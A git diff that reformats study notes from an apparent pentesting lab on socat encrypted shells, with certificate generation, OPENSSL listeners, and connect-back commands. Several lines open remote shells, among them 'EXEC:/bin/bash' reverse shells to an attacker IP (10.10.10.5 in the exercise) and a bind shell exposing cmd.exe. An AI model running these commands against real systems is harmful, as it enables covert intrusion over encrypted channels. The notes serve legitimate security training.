@@ -311,27 +311,48 @@ pty, stderr, sigint, setsid and sane:
 * On the left of the image below we have a listener running on our local attacking machine.
 
 ### Socat Encrypted Shells
-* One of the many great things about socat is that it's capable of creating encrypted bind and reverse shells.
-* Any time TCP is used as part of a socat command, this should be replaced with OPENSSL when working with encrypted shells.
-* We first need to generate a certificate in order to use encrypted shells.
-* This is easiest to do on our attacking machine: openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
-* This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year.
-* When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly.
-* We then need to merge the two created files into a single .pem file: cat shell.key shell.crt > shell.pem
-* Now, when we set up our reverse shell listener, we use: socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
-* This sets up an OPENSSL listener using our generated certificate.
-* verify=0 tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority.
-* Please note that the certificate must be used on whichever device is listening.
-* To connect back, we would use: socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
-* The same technique would apply for a bind shell:
-* On the target: socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
-* What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem": socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0
-* On the attacker: socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
-* If your IP is 10.10.10.5, what syntax would you use to connect back to this listener: socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,san
-* Note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required.
-* The following image shows an OPENSSL Reverse shell from a Linux target.
-* The target is on the right, and the attacker is on the left:
-* This technique will also work with the special, Linux-only TTY shell covered previously.
+* Socat is capable of creating encrypted bind and reverse shells.
+* Any TCP commands aree replaced with OPENSSL.
+* Need to generate a certificate on the attacking machine to use encrypted shells.
+  * 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year.
+```
+openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+```
+* Merge the two created files into a single .pem file.
+```
+cat shell.key shell.crt > shell.pem
+```
+* Set up reverse shell listener on attacking machine.
+  * Creates OPENSSL listener using the generated certificate.
+  * `verify=0` tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority.
+```
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
+```
+* Syntax to connect back from target.
+```
+socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
+```
+* For a bind shell.
+* Create listener on the target.
+```
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
+```
+* Syntax for setting up an OPENSSL-LISTENER using the tty technique.
+  * Use port 53 and a PEM file called "encrypt.pem"
+```
+socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0
+```
+* Connect from the attacker.
+```
+socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
+```
+* If the attacking IP is 10.10.10.5 what syntax would be used to connect back to the tty listener.
+```
+socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,san
+```
+* Even for a Windows target the certificate must be used with the listener.
+  * Copying the PEM file across for a bind shell is required.
+* This technique will work with the special Linux-only TTY shell covered previously.
 
 ## Common Shell Payloads
 * In some versions of netcat (including the nc.exe Windows version included with Kali at /usr/share/windows-resources/binaries, and the version used in Kali itself: netcat-traditional) there is a -e option which allows you to execute a process on connection.
